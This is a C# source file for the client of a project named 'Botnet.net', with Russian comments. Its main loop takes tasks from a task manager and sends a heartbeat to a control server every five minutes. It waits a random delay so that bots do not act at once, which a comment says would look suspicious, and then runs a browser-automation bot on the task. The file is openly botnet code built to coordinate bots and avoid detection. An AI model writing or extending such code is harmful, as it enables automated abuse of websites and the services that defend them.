using System;
using System.Text;
using System.Net;
using System.Threading;
using System.Windows.Forms;

using BotLib;

namespace Botnet.net
{
    static class Program
    {
        public static Thread ResponseServer { get; set; }
        public static Random rnd { get; set; }
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Task task;
            while (true)
            {
                if (TaskManager.TryGetTask(out task))
                {

                    ResponseServer = new Thread(() =>
                    {

                        using (WebClient WC = new WebClient() { Encoding = Encoding.UTF8 })
                            while (true)
                            {
                                WC.DownloadString("http://localhost:18682/Bot/Working?id=" + TaskManager.id.ToString());// Отклик каждые пять минут
                                Thread.Sleep(1000 * 60 * 5);
                            }
                    });
                    ResponseServer.IsBackground = true;
                    ResponseServer.Start();

                    Thread.Sleep(rnd.Next(30000, 180000));// Бот спит от 30 секунд до 3 минут, чтобы после получения задания боты не рынули все сразу т.к. это палевно

                    BotBrowser bot = new BotBrowser(task);

                    System.Threading.Thread closeApp = new System.Threading.Thread(() =>
                    {
                        bot.SleepToSession();
                        Application.Exit();// закрываем приложением
                        ResponseServer.Abort();//заканчиваем отклики серверу о работе
                    });
                    closeApp.IsBackground = true;
                    closeApp.Start();

                    Application.Run(bot);

                }
                Thread.Sleep(60 * 1000 * 5);//Задержка между сеансами 5 минут
            }
        }
    }
}
